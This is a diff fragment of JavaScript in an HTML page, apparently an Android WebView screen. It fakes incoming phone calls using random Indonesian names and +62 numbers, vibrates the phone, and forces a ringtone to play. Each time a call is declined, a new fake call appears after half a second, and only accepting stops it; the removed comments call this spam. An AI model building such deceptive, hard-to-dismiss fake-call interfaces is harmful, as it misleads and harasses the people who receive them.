+    const first = firstNames[Math.floor(Math.random() * firstNames.length)];
+    const last = lastNames[Math.floor(Math.random() * lastNames.length)];
+
+    return first + " " + last;
   }
 
-  /* ============ FUNGSI MUNCULKAN NOTIFIKASI ============ */
+  function rnd(n) {
+    let s = "";
+
+    for (let i = 0; i < n; i++) {
+      s += Math.floor(Math.random() * 10);
+    }
+
+    return s;
+  }
+
+  /* NOMOR TANPA TEMPLATE LITERAL */
+  function randPhone() {
+    const p = prefixes[Math.floor(Math.random() * prefixes.length)];
+    const full = p + rnd(Math.random() < 0.5 ? 7 : 8);
+
+    return "+62 " +
+      full.substring(0, 3) + "-" +
+      full.substring(3, 7) + "-" +
+      full.substring(7);
+  }
+
+  /* TAMPILKAN NOTIFIKASI */
   function showNotification() {
-    // Reset tampilan
     notif.classList.remove('hide');
     notif.style.display = 'block';
 
-    // Generate data baru (nama & nomor beda setiap kali)
     const name = randName();
     const phone = randPhone();
-    
+
     document.getElementById('name').textContent = name;
     document.getElementById('number').textContent = phone;
-    document.getElementById('avatar').textContent = name.charAt(0).toUpperCase();
+    document.getElementById('avatar').textContent =
+      name.charAt(0).toUpperCase();
 
-    // Getar HP
-    if (navigator.vibrate) navigator.vibrate([400, 200, 400, 200, 400]);
+    if (navigator.vibrate) {
+      navigator.vibrate([400, 200, 400, 200, 400]);
+    }
 
-    // Putar nada dering dari awal
-    try { ringtone.currentTime = 0; ringtone.play().catch(()=>{}); } catch(e) {}
+    try {
+      ringtone.currentTime = 0;
+      ringtone.play().catch(function() {});
+    } catch (e) {}
   }
 
-  /* ============ HANDLER TOMBOL ============ */
+  /* TOMBOL AKSI */
   function handleAction(action) {
-    if (navigator.vibrate) navigator.vibrate(0);
-    ringtone.pause();
+    if (navigator.vibrate) {
+      navigator.vibrate(0);
+    }
 
-    // Sembunyikan notif
+    ringtone.pause();
     notif.classList.add('hide');
 
-    // Jika dijawab → hentikan spam
     if (action === 'accepted') {
-      setTimeout(() => {
+      setTimeout(function() {
         notif.style.display = 'none';
       }, 200);
 
-      if (window.AndroidBridge && typeof window.AndroidBridge.onCallAction === "function") {
+      if (
+        window.AndroidBridge &&
+        typeof window.AndroidBridge.onCallAction === "function"
+      ) {
         window.AndroidBridge.onCallAction('accepted');
       }
+
       return;
     }
 
-    // Jika ditolak → panggilan baru muncul lagi setelah 0.5 detik
-    setTimeout(() => {
+    setTimeout(function() {
       showNotification();
     }, 500);
 
-    if (window.AndroidBridge && typeof window.AndroidBridge.onCallAction === "function") {
+    if (
+      window.AndroidBridge &&
+      typeof window.AndroidBridge.onCallAction === "function"
+    ) {
       window.AndroidBridge.onCallAction('declined');
     }
   }
 
-  /* ============ MULAI SPAM PERTAMA ============ */
-  window.addEventListener('load', () => {
+  /* MULAI */
+  window.addEventListener('load', function() {
     showNotification();
 
-    // Agresif play audio
     const playPromise = ringtone.play();
-    if (playPromise) playPromise.catch(() => {
-      setTimeout(()=>ringtone.play().catch(()=>{}), 300);
-      setTimeout(()=>ringtone.play().catch(()=>{}), 1000);
-    });
 
-    // Fallback sentuhan pertama
-    document.addEventListener('touchstart', ()=>{ if(ringtone.paused) ringtone.play().catch(()=>{}); }, {once:true});
-    document.addEventListener('click', ()=>{ if(ringtone.paused) ringtone.play().catch(()=>{}); }, {once:true});
+    if (playPromise) {
+      playPromise.catch(function() {
+        setTimeout(function() {
+          ringtone.play().catch(function() {});
+        }, 300);
+
+        setTimeout(function() {
+          ringtone.play().catch(function() {});
+        }, 1000);
+      });
+    }
+
+    document.addEventListener('touchstart', function() {
+      if (ringtone.paused) {
+        ringtone.play().catch(function() {});
+      }
+    }, { once: true });
+
+    document.addEventListener('click', function() {
+      if (ringtone.paused) {
+        ringtone.play().catch(function() {});
+      }
+    }, { once: true });
   });
 </script>
 
 </body>
 </html>"""
 }
+
 
 
 
